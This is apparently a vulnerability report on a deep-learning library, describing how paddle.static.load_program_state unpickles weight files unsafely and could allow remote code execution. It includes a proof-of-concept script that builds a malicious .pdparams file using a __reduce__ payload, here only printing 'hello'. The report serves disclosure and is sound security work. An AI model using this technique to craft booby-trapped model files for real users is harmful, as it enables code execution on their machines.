# Bug Description
When using paddle.static.load_program_state to load a static graph weight file, a deserialization vulnerability occurs due to the following call chain. An attacker can trick the victim into downloading and loading a malicious static graph weight file, ultimately leading to RCE
>python.paddle.static.io.load_program_state -> python.paddle.static.io_utils._safe_load_pickle -> pickle.Unpickler.__init__

pickle.Unpickler.__init__ is unsafe and can cause deserialization vulnerabilities, so the _safe_load_pickle function is not truly safe.

# poc
First, use the following code to generate a malicious static graph weight file.
```python
import pickle

class Exploit:
    def __reduce__(self):
        return (print, ("hello",))  

state = {
    "fc_0.w_0": Exploit(), 
}

with open("evil_model.pdparams", "wb") as f:
    pickle.dump(state, f)

```
Then load this malicious file.
```python
import paddle
state = paddle.static.load_program_state("evil_model.pdparams")
```
